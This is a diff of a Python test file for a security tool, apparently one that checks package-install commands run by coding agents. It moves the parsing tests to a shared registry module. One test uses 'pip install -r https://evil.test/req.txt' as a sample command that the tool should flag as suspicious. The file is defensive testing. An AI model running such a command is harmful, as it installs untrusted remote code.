@@ -125,66 +125,68 @@ def test_fish_uses_argv_not_quoted_string() -> None:
     assert "agentshield guard-scan-cmd pip $argv" in _FISH_INIT
 
 
-# ── guard-scan-cmd integration — via hermes parse ────────────────────────────
+# ── guard-scan-cmd integration — shared registry parser ──────────────────────
+# Parsing lives in exactly one place now (agentshield.enforce.registry); the
+# guard, the Hermes hook, and the Claude Code / Codex hook all use it.
 
 
-def test_hermes_parse_used_for_guard() -> None:
+def test_registry_parse_used_for_guard() -> None:
     from agentshield.core.models import Ecosystem
-    from agentshield.integrations.hermes.plugin import _parse_shell_packages
+    from agentshield.enforce.registry import parse_packages
 
-    pkgs = _parse_shell_packages("pip install requests flask")
+    pkgs = parse_packages("pip install requests flask")
     assert ("requests", Ecosystem.PYPI) in pkgs
     assert ("flask", Ecosystem.PYPI) in pkgs
 
 
-def test_hermes_parse_npm_for_guard() -> None:
+def test_registry_parse_npm_for_guard() -> None:
     from agentshield.core.models import Ecosystem
-    from agentshield.integrations.hermes.plugin import _parse_shell_packages
+    from agentshield.enforce.registry import parse_packages
 
-    pkgs = _parse_shell_packages("npm install lodash")
+    pkgs = parse_packages("npm install lodash")
     assert ("lodash", Ecosystem.NPM) in pkgs
 
 
-def test_hermes_parse_cargo_for_guard() -> None:
+def test_registry_parse_cargo_for_guard() -> None:
     from agentshield.core.models import Ecosystem
-    from agentshield.integrations.hermes.plugin import _parse_shell_packages
+    from agentshield.enforce.registry import parse_packages
 
-    pkgs = _parse_shell_packages("cargo add serde")
+    pkgs = parse_packages("cargo add serde")
     assert ("serde", Ecosystem.CARGO) in pkgs
 
 
-# ── _parse_shell_manifests (-r / -c requirements files) ──────────────────────
+# ── parse_manifests (-r / -c requirements files) ─────────────────────────────
 
 
 def test_parse_shell_manifests_requirement_flag() -> None:
-    from agentshield.integrations.hermes.plugin import _parse_shell_manifests
+    from agentshield.enforce.registry import parse_manifests
 
-    paths, suspicions = _parse_shell_manifests("pip install -r requirements.txt")
+    paths, suspicions = parse_manifests("pip install -r requirements.txt")
     assert paths == ["requirements.txt"]
     assert suspicions == []
 
 
 def test_parse_shell_manifests_long_and_equals_forms() -> None:
-    from agentshield.integrations.hermes.plugin import _parse_shell_manifests
+    from agentshield.enforce.registry import parse_manifests
 
-    paths, _ = _parse_shell_manifests("pip install --requirement dev.txt")
+    paths, _ = parse_manifests("pip install --requirement dev.txt")
     assert paths == ["dev.txt"]
-    paths, _ = _parse_shell_manifests("pip install --constraint=constraints.txt")
+    paths, _ = parse_manifests("pip install --constraint=constraints.txt")
     assert paths == ["constraints.txt"]
 
 
 def test_parse_shell_manifests_remote_is_suspicious() -> None:
-    from agentshield.integrations.hermes.plugin import _parse_shell_manifests
+    from agentshield.enforce.registry import parse_manifests
 
-    paths, suspicions = _parse_shell_manifests("pip install -r https://evil.test/req.txt")
+    paths, suspicions = parse_manifests("pip install -r https://evil.test/req.txt")
     assert paths == []
     assert any("remote requirements file" in s for s in suspicions)
 
 
 def test_parse_shell_manifests_ignores_named_packages() -> None:
-    from agentshield.integrations.hermes.plugin import _parse_shell_manifests
+    from agentshield.enforce.registry import parse_manifests
 
-    paths, suspicions = _parse_shell_manifests("pip install requests flask")
+    paths, suspicions = parse_manifests("pip install requests flask")
     assert paths == []
     assert suspicions == []
 
